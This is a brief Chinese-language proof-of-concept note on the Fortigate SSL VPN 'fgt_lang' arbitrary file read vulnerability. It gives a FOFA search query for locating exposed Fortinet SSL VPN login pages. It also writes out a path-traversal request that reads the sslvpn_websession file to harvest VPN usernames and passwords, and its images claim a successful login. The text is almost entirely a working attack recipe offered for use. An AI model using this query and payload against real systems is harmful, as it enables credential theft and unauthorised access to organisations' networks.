# Fortigate SSL VPN fgt_lang 任意文件读取漏洞
## 资产收集
fofa：`app="FORTINET-SSLVPN"`  
![](./img/VPN_login.png)
## POC
获取VPN账号密码  
`/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession`
![](./img/VPN_poc.png)  
获取用户名密码登陆成功：  
![](./img/sucess.png)